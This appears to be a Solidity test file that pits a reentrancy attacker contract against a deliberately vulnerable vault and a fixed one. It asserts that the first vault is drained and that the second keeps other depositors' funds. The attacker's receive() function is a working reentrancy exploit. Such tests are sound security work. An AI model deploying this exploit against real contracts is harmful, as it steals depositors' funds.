// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../VulnerableVault.sol";
import "../SecureVault.sol";

interface Vm {
    function deal(address account, uint256 newBalance) external;
}

interface IVault {
    function deposit() external payable;
    function withdraw() external;
    function getTotalBalance() external view returns (uint256);
}

contract ReenteringAttacker {
    IVault public immutable vault;
    bool public immutable expectReentryBlocked;
    uint256 public received;

    constructor(IVault target, bool shouldBlock) {
        vault = target;
        expectReentryBlocked = shouldBlock;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        received += msg.value;
        if (address(vault).balance > 0) {
            (bool success, ) = address(vault).call(
                abi.encodeWithSelector(IVault.withdraw.selector)
            );
            if (expectReentryBlocked) {
                require(!success, "re-entry unexpectedly succeeded");
            } else {
                require(success, "expected vulnerable re-entry to succeed");
            }
        }
    }
}

contract VaultReentrancyTest {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    receive() external payable {}

    function testVulnerableVaultCanBeDrainedByReentrancy() external {
        vm.deal(address(this), 12 ether);

        VulnerableVault vault = new VulnerableVault();
        vault.deposit{value: 10 ether}();

        ReenteringAttacker attacker = new ReenteringAttacker(IVault(address(vault)), false);
        attacker.attack{value: 1 ether}();

        require(vault.getTotalBalance() == 0, "vulnerable vault should be drained");
        require(address(attacker).balance == 11 ether, "attacker should receive victim and own funds");
    }

    function testSecureVaultPreservesOtherDepositorFunds() external {
        vm.deal(address(this), 12 ether);

        SecureVault vault = new SecureVault();
        vault.deposit{value: 10 ether}();

        ReenteringAttacker attacker = new ReenteringAttacker(IVault(address(vault)), true);
        attacker.attack{value: 1 ether}();

        require(vault.getTotalBalance() == 10 ether, "secure vault should retain victim funds");
        require(address(attacker).balance == 1 ether, "attacker should receive only own deposit");
    }
}
